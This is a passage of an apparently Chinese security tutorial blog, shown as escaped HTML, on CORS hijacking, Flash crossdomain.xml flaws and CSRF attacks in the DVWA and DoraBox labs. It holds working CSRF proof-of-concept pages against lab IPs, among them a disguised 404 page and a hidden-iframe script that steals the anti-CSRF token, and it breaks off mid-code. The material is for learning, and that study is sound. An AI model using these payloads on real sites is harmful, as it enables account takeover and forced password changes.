XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            req.onload = reqListener;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            req.open(&lt;span class=&quot;string&quot;&gt;&#39;get&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;http://127.0.0.1/DoraBox/csrf/userinfo.php &#39;&lt;/span&gt;,&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;//req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            req.withCredentials = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            req.send();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;reqListener&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; output = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;output&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                output.innerHTML = &lt;span class=&quot;string&quot;&gt;&quot;URL: http://127.0.0.1/DoraBox/csrf/userinfo.php &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Response:&amp;lt;br&amp;gt;&amp;lt;textarea style=&#39;width: 659px; height: 193px;&#39;&amp;gt;&quot;&lt;/span&gt; + req.responseText + &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;/textarea&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;&amp;lt;/&lt;/span&gt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404697.35.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571404749.23.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用CrossSiteContentHijacking测试&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571479827.75.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;防御：&lt;/p&gt;
+&lt;p&gt;加强对Origin的验证，即对cors进行严格的设置&lt;/p&gt;
+&lt;h3 id=&quot;Flash跨域&quot;&gt;&lt;a href=&quot;#Flash跨域&quot; class=&quot;headerlink&quot; title=&quot;Flash跨域&quot;&gt;&lt;/a&gt;Flash跨域&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Flash跨域比较经典了，在做web目录资产整理的时候有时候会发现这样的文件 &lt;strong&gt;crossdomain.xml&lt;/strong&gt; ，文件内容如果是如下的，那么就存在Flash跨域问题，如下内容的意思是支持所有域。flash跨域是通过.swf文件进行的，流程是：lsowl.top存在测试的swf文件想要跨域获取target.com中的敏感数据信息，首先会寻找target.com是否存在 &lt;strong&gt;crossdomain.xml&lt;/strong&gt;  ，如果存在则会查看是否允许lsowl.top访问，如果可以访问则存在flash跨域漏洞。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;cross-domain-policy&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;漏洞挖掘：由于没有找到测试的站点，所以文字描述，碰见存在&lt;strong&gt;crossdomain.xml&lt;/strong&gt; 的站，访问看一下配置，再找找有无数据接口，然后利用POC &lt;a href=&quot;https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf&quot;&gt;https://github.com/nccgroup/CrossSiteContentHijacking/raw/master/ContentHijacking/objects/ContentHijacking.swf&lt;/a&gt; 进行测试，或者是key师傅的&lt;a href=&quot;https://github.com/Acmesec/PoCBox&quot;&gt;pocbox&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;emm,没图，用key师傅的图&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571406720.75.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;防御：&lt;/p&gt;
+&lt;p&gt;修改&lt;strong&gt;crossdomain.xml&lt;/strong&gt;限制访问来源&lt;/p&gt;
+&lt;p&gt;利用DVWA进行CSRF验证&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;DVWA这里关于CSRF的漏洞点是重置密码&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&quot;low级别&quot;&gt;&lt;a href=&quot;#low级别&quot; class=&quot;headerlink&quot; title=&quot;low级别&quot;&gt;&lt;/a&gt;low级别&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386809.77.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527386943.9.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527389971.67.png&quot; alt=&quot;&quot;&gt;&lt;/h4&gt;&lt;p&gt;可以看到DVWA关于CSRF漏洞的出发点是GET请求，并且分析源码发现后台并没有任何过滤，直接出发CSRF漏洞&lt;/p&gt;
+&lt;h5 id=&quot;方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）&quot;&gt;&lt;a href=&quot;#方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）&quot; class=&quot;headerlink&quot; title=&quot;方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）&quot;&gt;&lt;/a&gt;方式一：直接构造链接，诱导用户点击（这种方式明显可以将链接转换为短链接）&lt;/h5&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;amp;password_conf=attack&amp;amp;Change=Change#&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h5 id=&quot;方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过&quot;&gt;&lt;a href=&quot;#方式二：构造一个伪装的页面，可信度更高一点-放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过&quot; class=&quot;headerlink&quot; title=&quot;方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)&quot;&gt;&lt;/a&gt;方式二：构造一个伪装的页面，可信度更高一点(放在这一台用户可以访问且攻击者可控的机器上，生成连接配合前面说的短链接诱导用户访问，如果没有跨域、token那些限制就可以直接触发，否则需要绕过)&lt;/h5&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://192.168.1.106/vulnerabilities/csrf/?password_new=attack&amp;amp;password_conf=attack&amp;amp;Change=Change#&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;border&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;display:none;&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;404&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;file not found.&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568860685.1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;当诱导用户点击过后CSRF已经触发，密码已经被修改&lt;/p&gt;
+&lt;h5 id=&quot;方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）&quot;&gt;&lt;a href=&quot;#方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）&quot; class=&quot;headerlink&quot; title=&quot;方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）&quot;&gt;&lt;/a&gt;方式三：使用burp的CSRF验证功能（自动生成表单的方式提交测试）&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861050.58.png&quot; alt=&quot;&quot;&gt;&lt;/h5&gt;&lt;p&gt;两种方式，在burp代理的情况下直接在浏览器中可以测试，或者可以将生成的POC(自己可以修改)复制下来，通过链接的形式来访问&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861215.33.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现密码已经修改&lt;/p&gt;
+&lt;h4 id=&quot;medium级别&quot;&gt;&lt;a href=&quot;#medium级别&quot; class=&quot;headerlink&quot; title=&quot;medium级别&quot;&gt;&lt;/a&gt;medium级别&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861395.6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;用之前的POC进行触发发现漏洞无法触发，根据提示查看源码，发现源码对于referer头进行了限制，显示了server_name，这里就是本地的地址&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568861469.09.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;所以这里的思路就是必须要在点击构造好的链接，数据包中的referer要包含192.168.1.106，所以，将之前的POC复制下来，然后新建一个HTML，命名为192.168.1.106.html,让模拟攻击者放在可控服务器上，让用户访问(注意，burpsuit的POC注释掉history.pushState函数，否则无法在referer头中添加server_name)&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)*/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;http://192.168.1.106/vulnerabilities/csrf/&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;password&amp;amp;#95;new&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;admin888&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;password&amp;amp;#95;conf&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;admin888&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Change&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Change&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Submit request&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862110.62.png&quot; alt=&quot;&quot;&gt;&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862136.12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到：referer头限制成功绕过，漏洞触发。&lt;/p&gt;
+&lt;h4 id=&quot;high级别&quot;&gt;&lt;a href=&quot;#high级别&quot; class=&quot;headerlink&quot; title=&quot;high级别&quot;&gt;&lt;/a&gt;high级别&lt;/h4&gt;&lt;h5 id=&quot;方法一：结合存储型xss&quot;&gt;&lt;a href=&quot;#方法一：结合存储型xss&quot; class=&quot;headerlink&quot; title=&quot;方法一：结合存储型xss&quot;&gt;&lt;/a&gt;方法一：结合存储型xss&lt;/h5&gt;&lt;p&gt;点击修改密码后抓取数据包如下&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862268.49.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现在请求中多了user_token,这样就可以使得csrf失效了，查看源码确认判断&lt;img src=&quot;https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568862497.23.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;怎么绕过呢，思路：在请求前获取到服务端下发的token，然后带入请求劫持用户操作，触发CSRF，将POC构造为一下可以获取user_token。攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。&lt;/p&gt;
+&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;script type=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;attack&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementsByName(&lt;span class=&quot;string&quot;&gt;&#39;user_token&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].value = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;hack&quot;&lt;/span&gt;).contentWindow.document.getElementsByName(&lt;span class=&quot;string&quot;&gt;&#39;user_token&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;transfer&quot;&lt;/span&gt;).submit();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;    &amp;lt;iframe src=&quot;http:/&lt;/span&gt;&lt;span class=&quot;regexp&quot;&gt;/192.168.1.106/&lt;/span&gt;vulnerabilities/csrf&lt;span class=&quot;string&quot;&gt;&quot; id=&quot;&lt;/span&gt;hack&lt;span class=&quot;string&quot;&gt;&quot; border=&quot;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot; style=&quot;&lt;/span&gt;display:none;&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    &amp;lt;body onload=&quot;&lt;/span&gt;attack()&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;        &amp;lt;form method=&quot;&lt;/span&gt;GET&lt;span class=&quot;string&quot;&gt;&quot; id=&quot;&lt;/span&gt;transfer&lt;span class=&quot;string&quot;&gt;&quot; action=&quot;&lt;/span&gt;http:&lt;span class=&quot;comment&quot;&gt;//192.168.1.106/vulnerabilities/csrf&quot;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;input type=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; name=&lt;span class=&quot;string&quot;&gt;&quot;password_new&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;attack&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;input type=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; name=&lt;span class=&quot;string&quot;&gt;&quot;password_conf&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;attack&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;input type=&lt;span class=&quot;string&quot;&gt;&quot;hidden&quot;&lt;/span&gt; name=&lt;span class=&quot;string&quot;&gt;&quot;user_token&quot;&lt;/span&gt; 